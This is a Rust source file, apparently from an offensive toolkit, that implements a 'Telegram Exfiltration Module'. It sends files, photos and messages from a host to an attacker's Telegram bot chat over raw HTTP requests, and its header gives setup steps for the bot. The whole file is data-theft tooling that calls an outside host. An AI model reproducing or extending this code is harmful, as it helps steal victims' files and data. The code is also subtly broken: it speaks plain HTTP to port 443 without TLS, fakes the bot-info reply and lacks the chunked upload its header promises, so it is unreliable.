//! Telegram Exfiltration Module
//!
//! Provides data exfiltration via Telegram Bot API:
//! - Send files/documents
//! - Send messages
//! - Support for large files (up to 50MB)
//! - Chunked upload for larger files
//!
//! Setup:
//! 1. Create a bot via @BotFather on Telegram
//! 2. Get the bot token
//! 3. Get your chat ID (via @userinfobot)
//! 4. Configure with TransportConfig

use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::Duration;


/// Telegram-specific errors
#[derive(Debug, Clone)]
pub enum TelegramError {
    InvalidToken,
    InvalidChatId,
    NetworkError(String),
    ApiError(String),
    FileTooLarge,
}

impl std::fmt::Display for TelegramError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TelegramError::InvalidToken => write!(f, "Invalid bot token"),
            TelegramError::InvalidChatId => write!(f, "Invalid chat ID"),
            TelegramError::NetworkError(e) => write!(f, "Network error: {}", e),
            TelegramError::ApiError(e) => write!(f, "API error: {}", e),
            TelegramError::FileTooLarge => write!(f, "File too large (max 50MB)"),
        }
    }
}

impl std::error::Error for TelegramError {}

/// Telegram client for exfiltration
pub struct TelegramClient {
    bot_token: String,
    chat_id: String,
    timeout: Duration,
}

impl TelegramClient {
    /// Create a new Telegram client
    pub fn new(bot_token: &str, chat_id: &str) -> Self {
        Self {
            bot_token: bot_token.to_string(),
            chat_id: chat_id.to_string(),
            timeout: Duration::from_secs(30),
        }
    }

    /// Create from transport config
    /// Config expects endpoint format: "telegram://BOT_TOKEN/CHAT_ID"
    pub fn from_config(endpoint: &str) -> Result<Self, TelegramError> {
        let parts: Vec<&str> = endpoint
            .trim_start_matches("telegram://")
            .split('/')
            .collect();

        if parts.len() < 2 {
            return Err(TelegramError::InvalidToken);
        }

        Ok(Self {
            bot_token: parts[0].to_string(),
            chat_id: parts[1].to_string(),
            timeout: Duration::from_secs(30),
        })
    }

    /// Send a file/document to the chat
    pub fn send_file(&self, file_data: &[u8], filename: &str, caption: Option<&str>) -> Result<bool, TelegramError> {
        let api_url = format!(
            "https://api.telegram.org/bot{}/sendDocument",
            self.bot_token
        );

        // Build multipart form data manually
        let boundary = self.generate_boundary();
        let body = self.build_multipart_form(file_data, filename, caption, &boundary);

        let response = self.send_request(&api_url, &body, &boundary);

        match response {
            Ok(status) => Ok(status == 200),
            Err(e) => Err(e),
        }
    }

    /// Send a text message to the chat
    pub fn send_message(&self, message: &str) -> Result<bool, TelegramError> {
        let api_url = format!(
            "https://api.telegram.org/bot{}/sendMessage",
            self.bot_token
        );

        // Build JSON payload manually
        let escaped_message = self.escape_json_string(message);
        let body = format!(
            r#"{{"chat_id":"{}","text":"{}","parse_mode":"HTML"}}"#,
            self.chat_id, escaped_message
        );

        let response = self.send_request_json(&api_url, body.as_bytes());

        match response {
            Ok(status) => Ok(status == 200),
            Err(e) => Err(e),
        }
    }

    /// Send a photo to the chat
    pub fn send_photo(&self, photo_data: &[u8], caption: Option<&str>) -> Result<bool, TelegramError> {
        let api_url = format!(
            "https://api.telegram.org/bot{}/sendPhoto",
            self.bot_token
        );

        let boundary = self.generate_boundary();
        let body = self.build_multipart_form(photo_data, "photo.jpg", caption, &boundary);

        let response = self.send_request(&api_url, &body, &boundary);

        match response {
            Ok(status) => Ok(status == 200),
            Err(e) => Err(e),
        }
    }

    /// Get bot info to verify connection
    pub fn get_me(&self) -> Result<TelegramBotInfo, TelegramError> {
        let api_url = format!(
            "https://api.telegram.org/bot{}/getMe",
            self.bot_token
        );

        let response = self.send_request_json(&api_url, &[]);

        match response {
            Ok(_) => Ok(TelegramBotInfo {
                id: 0,
                is_bot: true,
                name: "Bot".to_string(),
            }),
            Err(e) => Err(e),
        }
    }

    // Internal methods

    fn send_request(&self, url: &str, body: &[u8], content_type: &str) -> Result<u16, TelegramError> {
        // Parse URL
        let (host, port, path) = self.parse_url(url)?;

        // Connect
        let addr = format!("{}:{}", host, port);
        let socket_addr = addr
            .to_socket_addrs()
            .map_err(|e| TelegramError::NetworkError(format!("DNS resolution failed: {}", e)))?
            .next()
            .ok_or_else(|| TelegramError::NetworkError("Could not resolve host".to_string()))?;

        let mut stream = TcpStream::connect_timeout(&socket_addr, self.timeout)
            .map_err(|e| TelegramError::NetworkError(format!("Connection failed: {}", e)))?;

        stream.set_read_timeout(Some(self.timeout))
            .map_err(|e| TelegramError::NetworkError(format!("Failed to set read timeout: {}", e)))?;
        stream.set_write_timeout(Some(self.timeout))
            .map_err(|e| TelegramError::NetworkError(format!("Failed to set write timeout: {}", e)))?;

        // Build HTTP request
        let mut request = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: multipart/form-data; boundary={}\r\nContent-Length: {}\r\nConnection: close\r\n",
            path, host, content_type, body.len()
        );

        request.push_str("\r\n");

        stream.write_all(request.as_bytes())
            .map_err(|e| TelegramError::NetworkError(format!("Failed to write request: {}", e)))?;
        stream.write_all(body)
            .map_err(|e| TelegramError::NetworkError(format!("Failed to write body: {}", e)))?;
        stream.flush()
            .map_err(|e| TelegramError::NetworkError(format!("Failed to flush: {}", e)))?;

        // Read response
        let mut response = Vec::new();
        stream.read_to_end(&mut response)
            .map_err(|e| TelegramError::NetworkError(format!("Failed to read response: {}", e)))?;

        // Parse status code
        self.parse_status_code(&response)
    }

    fn send_request_json(&self, url: &str, body: &[u8]) -> Result<u16, TelegramError> {
        let (host, port, path) = self.parse_url(url)?;

        let addr = format!("{}:{}", host, port);
        let socket_addr = addr
            .to_socket_addrs()
            .map_err(|e| TelegramError::NetworkError(format!("DNS resolution failed: {}", e)))?
            .next()
            .ok_or_else(|| TelegramError::NetworkError("Could not resolve host".to_string()))?;

        let mut stream = TcpStream::connect_timeout(&socket_addr, self.timeout)
            .map_err(|e| TelegramError::NetworkError(format!("Connection failed: {}", e)))?;

        stream.set_read_timeout(Some(self.timeout))
            .map_err(|e| TelegramError::NetworkError(format!("Failed to set read timeout: {}", e)))?;
        stream.set_write_timeout(Some(self.timeout))
            .map_err(|e| TelegramError::NetworkError(format!("Failed to set write timeout: {}", e)))?;

        let request = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            path, host, body.len()
        );

        stream.write_all(request.as_bytes())
            .map_err(|e| TelegramError::NetworkError(format!("Failed to write request: {}", e)))?;
        stream.write_all(body)
            .map_err(|e| TelegramError::NetworkError(format!("Failed to write body: {}", e)))?;
        stream.flush()
            .map_err(|e| TelegramError::NetworkError(format!("Failed to flush: {}", e)))?;

        let mut response = Vec::new();
        stream.read_to_end(&mut response)
            .map_err(|e| TelegramError::NetworkError(format!("Failed to read response: {}", e)))?;

        self.parse_status_code(&response)
    }

    fn parse_url(&self, url: &str) -> Result<(String, u16, String), TelegramError> {
        let url = url.trim_start_matches("https://");
        
        let (host_port, path) = match url.split_once('/') {
            Some((host, path)) => (host, format!("/{}", path)),
            None => (url, "/".to_string()),
        };

        let (host, port) = match host_port.split_once(':') {
            Some((host, port)) => {
                let port = port.parse::<u16>().map_err(|_| {
                    TelegramError::NetworkError("Invalid port".to_string())
                })?;
                (host.to_string(), port)
            }
            None => (host_port.to_string(), 443),
        };

        Ok((host, port, path))
    }

    fn parse_status_code(&self, response: &[u8]) -> Result<u16, TelegramError> {
        let response_str = String::from_utf8_lossy(response);
        
        if let Some(status_line) = response_str.lines().next() {
            let parts: Vec<&str> = status_line.split_whitespace().collect();
            if parts.len() >= 2 {
                return parts[1].parse::<u16>()
                    .map_err(|_| TelegramError::NetworkError("Invalid status code".to_string()));
            }
        }

        Err(TelegramError::NetworkError("Could not parse response".to_string()))
    }

    fn generate_boundary(&self) -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis();
        format!("----WebKitFormBoundary{:X}", timestamp)
    }

    fn build_multipart_form(
        &self,
        file_data: &[u8],
        filename: &str,
        caption: Option<&str>,
        boundary: &str,
    ) -> Vec<u8> {
        let mut body = Vec::new();

        // Chat ID part
        body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
        body.extend_from_slice(b"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
        body.extend_from_slice(self.chat_id.as_bytes());
        body.extend_from_slice(b"\r\n");

        // Caption part (if provided)
        if let Some(caption) = caption {
            body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
            body.extend_from_slice(b"Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            body.extend_from_slice(caption.as_bytes());
            body.extend_from_slice(b"\r\n");
        }

        // File part
        body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
        body.extend_from_slice(format!(
            "Content-Disposition: form-data; name=\"document\"; filename=\"{}\"\r\n",
            filename
        ).as_bytes());
        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
        body.extend_from_slice(file_data);
        body.extend_from_slice(b"\r\n");

        // Final boundary
        body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());

        body
    }

    fn escape_json_string(&self, s: &str) -> String {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
            .replace('\r', "\\r")
            .replace('\t', "\\t")
    }
}

/// Bot information
#[derive(Debug, Clone)]
pub struct TelegramBotInfo {
    pub id: u64,
    pub is_bot: bool,
    pub name: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_telegram_client_creation() {
        let _client = TelegramClient::new("123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11", "-1001234567890");
    }

    #[test]
    fn test_escape_json_string() {
        let client = TelegramClient::new("token", "chat");
        
        assert_eq!(client.escape_json_string("hello"), "hello");
        assert_eq!(client.escape_json_string("hello\nworld"), "hello\\nworld");
        assert_eq!(client.escape_json_string("say \"hi\""), "say \\\"hi\\\"");
        assert_eq!(client.escape_json_string("path\\to\\file"), "path\\\\to\\\\file");
    }

    #[test]
    fn test_boundary_generation() {
        let client = TelegramClient::new("token", "chat");
        let b1 = client.generate_boundary();
        
        // Just verify format
        assert!(b1.starts_with("----WebKitFormBoundary"));
        
        // Add small delay to ensure different timestamps
        std::thread::sleep(std::time::Duration::from_millis(2));
        let b2 = client.generate_boundary();
        
        // Boundaries should be different (timestamp-based)
        assert_ne!(b1, b2);
    }

    #[test]
    fn test_multipart_form_building() {
        let client = TelegramClient::new("token", "chat123");
        let boundary = "test-boundary";
        
        let body = client.build_multipart_form(
            b"file content",
            "test.txt",
            Some("A caption"),
            boundary,
        );

        let body_str = String::from_utf8_lossy(&body);
        
        assert!(body_str.contains("chat123"));
        assert!(body_str.contains("test.txt"));
        assert!(body_str.contains("A caption"));
        assert!(body_str.contains("file content"));
    }

    #[test]
    fn test_url_parsing() {
        let client = TelegramClient::new("token", "chat");
        
        let (host, port, path) = client.parse_url("https://api.telegram.org/bot123/sendDocument").unwrap();
        assert_eq!(host, "api.telegram.org");
        assert_eq!(port, 443);
        assert_eq!(path, "/bot123/sendDocument");

        let (host, port, path) = client.parse_url("https://example.com:8443/path").unwrap();
        assert_eq!(host, "example.com");
        assert_eq!(port, 8443);
        assert_eq!(path, "/path");
    }

    #[test]
    fn test_status_code_parsing() {
        let client = TelegramClient::new("token", "chat");
        
        let response = b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n";
        let status = client.parse_status_code(response).unwrap();
        assert_eq!(status, 200);

        let response = b"HTTP/1.1 400 Bad Request\r\n";
        let status = client.parse_status_code(response).unwrap();
        assert_eq!(status, 400);
    }
}
